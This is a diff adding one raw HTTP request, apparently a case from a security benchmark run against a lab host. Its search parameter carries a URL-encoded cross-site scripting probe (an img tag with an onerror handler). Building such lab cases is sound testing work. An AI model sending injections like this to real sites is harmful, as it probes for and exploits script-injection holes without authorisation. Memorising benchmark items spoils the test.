@@ -1,0 +1,6 @@
+GET /api/v1/search?term=LAB_MARKER+%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&page=1 HTTP/1.1
+Host: lab-otc.example.invalid
+User-Agent: OTC-Benchmark/2.0
+Accept: application/json
+X-Lab-Case: OTC-BENCH-014
+
